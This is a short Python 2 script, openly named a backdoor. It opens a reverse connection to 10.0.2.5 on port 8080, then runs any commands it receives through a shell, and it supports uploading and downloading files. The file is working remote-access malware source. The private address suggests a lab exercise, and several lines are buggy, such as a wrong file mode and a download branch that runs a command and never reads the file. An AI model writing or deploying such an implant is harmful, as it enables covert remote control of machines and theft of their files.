#!/usr/bin/python2
import socket
import subprocess
import simplejson
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    def command_exec(self, command):
        return subprocess.check_output(command, shell=True)

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue


    def cd_exec(self,dir):
        os.chdir(dir)
        return "cedd to " + dir

    def read_download(self, path):
        with open(path, "rd") as read_file:
            return base64.b64encode(read_file.read())

    def write_upload(self, path, content):
        with open(path, "wb") as upload_file:
            upload_file.write(base64.b64decode(content))
            return "upload success"


    def socket_starter(self):
        while True:
            command = self.json_receive()
            command_output = self.command_exec(command)

            try:
                if command[0] == "exit":
                    self.my_connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.cd_exec(command[1])
                elif command[0] == "download":
                    command_output = self.command_exec(command[1])
                elif command[0] == "upload":
                    command_output = self.write_upload(command[1], command[2])
                else:
                    command_output == self.command_exec(command)
            except Exception:
                command_output = "Error!"
            self.json_send(command_output)
        self.my_connection.close()

socket_object = Backdoor("10.0.2.5", 8080)
socket_object.socket_starter()